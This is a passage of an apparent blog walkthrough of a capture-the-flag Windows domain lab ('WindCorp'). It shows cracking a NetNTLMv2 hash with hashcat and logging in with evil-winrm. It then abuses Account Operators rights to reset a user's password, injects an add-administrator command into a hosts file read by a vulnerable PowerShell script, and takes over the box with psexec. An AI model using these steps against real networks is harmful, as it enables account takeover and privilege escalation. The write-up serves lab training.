+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>hashcat.exe -a <span style="color:#bd93f9">0</span> -m <span style="color:#bd93f9">5600</span> <span style="color:#f1fa8c">&#34;buse::WINDCORP:1122334455667788:96320659CCC8CCD0C23852F82AA669C8:0101000000000000792F24210DCCD701CB9891E68DB963FB000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000200000B25F9F074A7F2B076C71892C3D7F9B988260CA42BCBEB4E1863C7810B3FF276D0A00100000000000000000000000000000000000090000000000000000000000&#34;</span> C:<span style="color:#f1fa8c">\r</span>ockyou.txt
+</span></span></code></pre></div><p>upon a successful crack, we&rsquo;ll get the password <code>uzunLM+3131</code>. great- ! now we have another set of credentials &ndash; buse:uzunLM+3131</p>
+<p>note: i do recommend saving found/cracked credentials in a text file. that way we&rsquo;re not constantly scrolling through terminal trying to find them.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;buse:uzunLM+3131&#34;</span> &gt; creds.txt
+</span></span></code></pre></div><p>now we get to use one of my favourite tools ever: <a href="https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/"  target="_blank" rel="noreferrer nofollow">evil winrm</a>
+. if you don&rsquo;t know, evil winrm is basically the go-to tool, sometimes used by sysadmins but mostly by hackers, to remotely access a windows machine. it&rsquo;s extremely useful in the post-exploitation phase.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>evil-winrm -u buse -p uzunLM+3131 -i windcorp.thm
+</span></span></code></pre></div><p>this will log us in as buse, and upon poking around, you&rsquo;ll locate the 2nd flag.</p>
+<p>what&rsquo;s more interesting though, and which proves to eventually be vital in privilege escalation, is a folder in C:\ that contains a powershell script and its log.</p>
+<ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/busescripts.PNG" alt="busescripts"  />
+</p>
+</li>
+</ul>
+<p>the code for the checkservers.ps1 script is as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#6272a4"># reset the lists of hosts prior to looping</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$OutageHosts</span> = $Null
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># specify the time you want email notifications resent for hosts that are down</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$EmailTimeOut</span> = <span style="color:#bd93f9">30</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># specify the time you want to cycle through your host lists.</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$SleepTimeOut</span> = <span style="color:#bd93f9">45</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># specify the maximum hosts that can be down before the script is aborted</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$MaxOutageCount</span> = <span style="color:#bd93f9">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># specify who gets notified</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$notificationto</span> = <span style="color:#f1fa8c">&#34;brittanycr@windcorp.thm&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># specify where the notifications come from</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$notificationfrom</span> = <span style="color:#f1fa8c">&#34;admin@windcorp.thm&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># specify the SMTP server</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$smtpserver</span> = <span style="color:#f1fa8c">&#34;relay.windcorp.thm&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># start looping here</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">Do</span>{
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$available</span> = $Null
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$notavailable</span> = $Null
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">Write-Host</span> (<span style="color:#8be9fd;font-style:italic">Get-Date</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Read the File with the Hosts every cycle, this way to can add/remove hosts</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># from the list without touching the script/scheduled task,</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># also hash/comment (#) out any hosts that are going for maintenance or are down.</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">get-content</span> C:\Users\brittanycr\hosts.txt | <span style="color:#8be9fd;font-style:italic">Where-Object</span> {!(<span style="color:#8be9fd;font-style:italic">$_</span> <span style="color:#ff79c6">-match</span> <span style="color:#f1fa8c">&#34;#&#34;</span>)} |
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">ForEach-Object</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$p</span> = <span style="color:#f1fa8c">&#34;Test-Connection -ComputerName </span><span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#f1fa8c"> -Count 1 -ea silentlycontinue&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">Invoke-Expression</span> <span style="color:#8be9fd;font-style:italic">$p</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span>(<span style="color:#8be9fd;font-style:italic">$p</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>     <span style="color:#6272a4"># if the Host is available then just write it to the screen</span>
+</span></span><span style="display:flex;"><span>     <span style="color:#8be9fd;font-style:italic">write-host</span> <span style="color:#f1fa8c">&#34;Available host ---&gt; &#34;</span><span style="color:#8be9fd;font-style:italic">$_</span> -BackgroundColor Green -ForegroundColor White
+</span></span><span style="display:flex;"><span>     [Array]<span style="color:#8be9fd;font-style:italic">$available</span> += <span style="color:#8be9fd;font-style:italic">$_</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">else</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>     <span style="color:#6272a4"># If the host is unavailable, give a warning to screen</span>
+</span></span><span style="display:flex;"><span>     <span style="color:#8be9fd;font-style:italic">write-host</span> <span style="color:#f1fa8c">&#34;Unavailable host ------------&gt; &#34;</span><span style="color:#8be9fd;font-style:italic">$_</span> -BackgroundColor Magenta -ForegroundColor White
+</span></span><span style="display:flex;"><span>     <span style="color:#8be9fd;font-style:italic">$p</span> = <span style="color:#8be9fd;font-style:italic">Test-Connection</span> -ComputerName <span style="color:#8be9fd;font-style:italic">$_</span> -Count <span style="color:#bd93f9">1</span> -ea silentlycontinue
+</span></span><span style="display:flex;"><span>     <span style="color:#ff79c6">if</span>(!(<span style="color:#8be9fd;font-style:italic">$p</span>))
+</span></span><span style="display:flex;"><span>       {
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># If the host is still unavailable for 4 full pings, write error and send email</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">write-host</span> <span style="color:#f1fa8c">&#34;Unavailable host ------------&gt; &#34;</span><span style="color:#8be9fd;font-style:italic">$_</span> -BackgroundColor Red -ForegroundColor White
+</span></span><span style="display:flex;"><span>        [Array]<span style="color:#8be9fd;font-style:italic">$notavailable</span> += <span style="color:#8be9fd;font-style:italic">$_</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$OutageHosts</span> <span style="color:#ff79c6">-ne</span> $Null)
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (!<span style="color:#8be9fd;font-style:italic">$OutageHosts</span>.ContainsKey(<span style="color:#8be9fd;font-style:italic">$_</span>))
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                 <span style="color:#6272a4"># First time down add to the list and send email</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#8be9fd;font-style:italic">Write-Host</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#f1fa8c"> Is not in the OutageHosts list, first time down&#34;</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#8be9fd;font-style:italic">$OutageHosts</span>.Add(<span style="color:#8be9fd;font-style:italic">$_</span>,(<span style="color:#8be9fd;font-style:italic">get-date</span>))
+</span></span><span style="display:flex;"><span>                 <span style="color:#8be9fd;font-style:italic">$Now</span> = <span style="color:#8be9fd;font-style:italic">Get-date</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#8be9fd;font-style:italic">$Body</span> = <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#f1fa8c"> has not responded for 5 pings at </span><span style="color:#8be9fd;font-style:italic">$Now</span><span style="color:#f1fa8c">&#34;</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#8be9fd;font-style:italic">Send-MailMessage</span> -Body <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$body</span><span style="color:#f1fa8c">&#34;</span> -to <span style="color:#8be9fd;font-style:italic">$notificationto</span> -from <span style="color:#8be9fd;font-style:italic">$notificationfrom</span> `
+</span></span><span style="display:flex;"><span>                  -Subject <span style="color:#f1fa8c">&#34;Host </span><span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#f1fa8c"> is down&#34;</span> -SmtpServer <span style="color:#8be9fd;font-style:italic">$smtpserver</span>
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">else</span>
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                    <span style="color:#6272a4"># If the host is in the list do nothing for 1 hour and then remove from the list.</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#8be9fd;font-style:italic">Write-Host</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#f1fa8c"> Is in the OutageHosts list&#34;</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">if</span> (((<span style="color:#8be9fd;font-style:italic">Get-Date</span>) - <span style="color:#8be9fd;font-style:italic">$OutageHosts</span>.Item(<span style="color:#8be9fd;font-style:italic">$_</span>)).TotalMinutes <span style="color:#ff79c6">-gt</span> <span style="color:#8be9fd;font-style:italic">$EmailTimeOut</span>)
+</span></span><span style="display:flex;"><span>                    {<span style="color:#8be9fd;font-style:italic">$OutageHosts</span>.Remove(<span style="color:#8be9fd;font-style:italic">$_</span>)}
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#6272a4"># First time down create the list and send email</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">Write-Host</span> <span style="color:#f1fa8c">&#34;Adding </span><span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#f1fa8c"> to OutageHosts.&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">$OutageHosts</span> = @{<span style="color:#8be9fd;font-style:italic">$_</span>=(<span style="color:#8be9fd;font-style:italic">get-date</span>)}
+</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">$Body</span> = <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#f1fa8c"> has not responded for 5 pings at </span><span style="color:#8be9fd;font-style:italic">$Now</span><span style="color:#f1fa8c">&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">Send-MailMessage</span> -Body <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$body</span><span style="color:#f1fa8c">&#34;</span> -to <span style="color:#8be9fd;font-style:italic">$notificationto</span> -from <span style="color:#8be9fd;font-style:italic">$notificationfrom</span> `
+</span></span><span style="display:flex;"><span>                 -Subject <span style="color:#f1fa8c">&#34;Host </span><span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#f1fa8c"> is down&#34;</span> -SmtpServer <span style="color:#8be9fd;font-style:italic">$smtpserver</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>       }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Report to screen the details</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$log</span> = <span style="color:#f1fa8c">&#34;Last run: </span>$(<span style="color:#8be9fd;font-style:italic">Get-Date</span>)<span style="color:#f1fa8c">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">write-host</span> <span style="color:#8be9fd;font-style:italic">$log</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">Set-Content</span> -Path C:\scripts\log.txt -Value <span style="color:#8be9fd;font-style:italic">$log</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">Write-Host</span> <span style="color:#f1fa8c">&#34;Available count:&#34;</span><span style="color:#8be9fd;font-style:italic">$available</span>.count
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">Write-Host</span> <span style="color:#f1fa8c">&#34;Not available count:&#34;</span><span style="color:#8be9fd;font-style:italic">$notavailable</span>.count
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">Write-Host</span> <span style="color:#f1fa8c">&#34;Not available hosts:&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$OutageHosts</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">Write-Host</span> <span style="color:#f1fa8c">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">Write-Host</span> <span style="color:#f1fa8c">&#34;Sleeping </span><span style="color:#8be9fd;font-style:italic">$SleepTimeOut</span><span style="color:#f1fa8c"> seconds&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">sleep </span><span style="color:#8be9fd;font-style:italic">$SleepTimeOut</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$OutageHosts</span>.Count <span style="color:#ff79c6">-gt</span> <span style="color:#8be9fd;font-style:italic">$MaxOutageCount</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># If there are more than a certain number of host down in an hour abort the script.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$Exit</span> = $True
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$body</span> = <span style="color:#8be9fd;font-style:italic">$OutageHosts</span> | <span style="color:#8be9fd;font-style:italic">Out-String</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">Send-MailMessage</span> -Body <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$body</span><span style="color:#f1fa8c">&#34;</span> -to <span style="color:#8be9fd;font-style:italic">$notificationto</span> -from <span style="color:#8be9fd;font-style:italic">$notificationfrom</span> `
+</span></span><span style="display:flex;"><span>     -Subject <span style="color:#f1fa8c">&#34;More than </span><span style="color:#8be9fd;font-style:italic">$MaxOutageCount</span><span style="color:#f1fa8c"> Hosts down, monitoring aborted&#34;</span> -SmtpServer <span style="color:#8be9fd;font-style:italic">$smtpServer</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">while</span> (<span style="color:#8be9fd;font-style:italic">$Exit</span> <span style="color:#ff79c6">-ne</span> $True)
+</span></span></code></pre></div><p>it looks like this code is checking the status of some hosts every 1 minute, from a file stored at <code>C:\Users\brittanycr\hosts.txt</code>.</p>
+<p>when we try to read brittanycr&rsquo;s directories, our access is denied.</p>
+<ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/brittanycr.PNG" alt="brittanycr"  />
+</p>
+</li>
+</ul>
+<p>if we run the command <code>whoami /groups</code> as buse, we&rsquo;ll see that buse is in the group &ldquo;account operators&rdquo;.</p>
+<ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/whoamigroups.PNG" alt="whoamigroups"  />
+</p>
+</li>
+</ul>
+<p>account operators can change passwords for other users, which means buse can change the password for brittanycr.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>net user brittanycr wEiRdP@$$W0rd1234! /domain
+</span></span></code></pre></div><p>(i chose this password because it complies with the password policy.)</p>
+<p>once the password has been changed, let&rsquo;s try to get that file at <code>C:\Users\brittanycr\hosts.txt</code>. since the checkservers.ps1 script reads from this file without being too annoying about checking what&rsquo;s in it, we&rsquo;re gonna inject a little bit of code into it and get the script to run it. this will be our ticket into getting root access.</p>
+<p>getting in:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>smbclient <span style="color:#f1fa8c">\\\\</span>windcorp.thm<span style="color:#f1fa8c">\\</span>Users -U brittanycr --password wEiRdP@<span style="color:#8be9fd;font-style:italic">$$</span>W0rd1234!
+</span></span></code></pre></div><p>navigate to the folder above and download the hosts.txt file, then edit it to add the following bit of code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-s" data-lang="s"><span style="display:flex;"><span>; net user bilal <span style="color:#f1fa8c">&#39;p*s$w0rd123&#39;</span> <span style="color:#ff79c6">/</span>add; net localgroup Administrators bilal <span style="color:#ff79c6">/</span>add
+</span></span></code></pre></div><ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/hosts.PNG" alt="hosts"  />
+</p>
+</li>
+</ul>
+<p>when the script performs this little maneuver, it will inadvertently create a user &ldquo;bilal&rdquo;, and add me to the Administrators group heh heh.</p>
+<p>we have to replace the previous hosts.txt file with the new one. we can do this using the <code>upload</code> command in brittanycr&rsquo;s evil winrm instance.</p>
+<p>now if we navigate to buse&rsquo;s &ldquo;scripts&rdquo; folder, keep checking the log file to see if the script has been successfully run. it might be a bit of a wait, but if you&rsquo;re patient, you&rsquo;ll see the script will have run.</p>
+<p>we should now be able to access the network with our new (root) credentials.</p>
+<ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/evilwinrmfail.PNG" alt="evilwinrmfail"  />
+</p>
+</li>
+</ul>
+<p>hmmm, evil winrm is failing to log me in. maybe we can use another tool?</p>
+<p>first, i have to check if my credentials are actually root. to do this, let&rsquo;s use <a href="https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/"  target="_blank" rel="noreferrer nofollow">crackmapexec</a>
+, a badass tool that quickly assesses the security of large AD networks. if it says we have access, i&rsquo;ll use psexec.py to log in.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>crackmapexec smb windcorp.thm -u bilal -p <span style="color:#f1fa8c">&#39;p*s$w0rd123&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>python3 /usr/share/doc/python3-impacket/examples/psexec.py bilal@windcorp.thm
+</span></span></code></pre></div><ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/pwned.PNG" alt="pwned"  />
+</p>
+</li>
+</ul>
+<p>hell yeah, <em>we&rsquo;re in</em>.</p>
+<ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/rootflag.PNG" alt="rootflag"  />
+</p>
+</li>
+</ul>
+<p>that was a hell of a ride. from doing a bit of recon on the company&rsquo;s users, sending fake links to IT, getting their hash then password, then injecting our own malicious code into a routine script to get root&hellip;i guess WindCorp isn&rsquo;t unhackable after all :)</p>
+</main>
+
+
+
+<footer>
+  <div class="footer-nav">
+    
+    <a class="next" href="/posts/update/" style="float: right"
+      >next: update</a
+    >
+     
+    <a class="previous" href="/posts/overpass2/">previous</a>
+    
+  </div>
+</footer>
+
+
+
+<script defer>
+  document.addEventListener("keydown", function (e) {
+    if (document.activeElement.isContentEditable) {
+      return false;
+    }
+    if (document.activeElement.tagName == "INPUT") {
+      return false;
+    }
+    if (e.altKey || e.ctrlKey || e.shiftKey) {
+      return false;
+    }
+    var key = e.key;
+    if (key === "h") {
+      e.preventDefault();
+      e.stopPropagation();
+      window.location.href = "/";
+    } else if (key === "t") {
+      e.preventDefault();
+      e.stopPropagation();
+      window.location.href = `https://${location.hostname}/tags`;
+    } else if (key === "i") {
+      e.preventDefault();
+      e.stopPropagation();
+      const inputs = document.querySelectorAll("input");
+      for (let i = 0; i < inputs.length; i++) {
+        if (inputs[i].offsetParent !== null) {
+          inputs[i].selectionStart = inputs[i].selectionEnd =
+            inputs[i].value.length;
+          inputs[i].focus();
+          break;
+        }
+      }
+    }
+    return false;
+  });
+</script>
+
+
+<script defer>
+  function throttle(fn, wait) {
+    var time = Date.now();
+    return function () {
+      var now = Date.now()
+      if (time + wait - now < 0) {
+        fn();
+        time = now;
+      }
+    };
+  }
+
+  function scrollHandler() {
+    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));
+
+    function scrollCallback() {
+      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+
+      
+      for (var i = 0; i < anchors.length; i++) {
+        var anchorId = anchors[i].getAttribute("id");
+        var link = document.querySelector(
+          'nav ul li a[href="#' + anchorId + '"]',
+        );
+        if (link) {
+          link.classList.remove("active-toc");
+        }
+      }
+
+      
+      for (var i = anchors.length - 1; i >= 0; i--) {
+        var offsetTop = anchors[i].offsetTop;
+        if (scrollTop > offsetTop - 75) {
+          var anchorId = anchors[i].getAttribute("id");
+          var link = document.querySelector(
+            'nav ul li a[href="#' + anchorId + '"]',
+          );
+          if (link) {
+            link.classList.add("active-toc");
+            break;
+          }
+        }
+      }
+    }
+
+    window.addEventListener(
+      "scroll",
+      throttle(scrollCallback, 300),
+    );
+  }
+  setTimeout(scrollHandler, 100);
+</script>
+
+<script defer>
+  function addCopyButtonToCodeBlocks() {
+    
+    const codeBlocks = document.querySelectorAll('code[class^="language-"]');
+
+    codeBlocks.forEach((codeBlock) => {
+      const copyButton = document.createElement("button");
+      copyButton.classList.add("copy-code-button");
+      copyButton.innerHTML = "copy";
+
+      
+      copyButton.addEventListener("click", () => {
+        
+        const elements = codeBlock.querySelectorAll(".cl");
+        let codeToCopy = "";
+        elements.forEach((element) => {
+          codeToCopy += element.innerText;
+        });
+        navigator.clipboard.writeText(codeToCopy);
+
+        
+        copyButton.innerHTML = "copied!";
+        setTimeout(() => {
+          copyButton.innerHTML = "copy";
+        }, 1500);
+      });
+
+      
+      codeBlock.parentNode.before(copyButton);
+    });
+  }
+  setTimeout(function () {
+    addCopyButtonToCodeBlocks();
+  }, 100);
+</script>
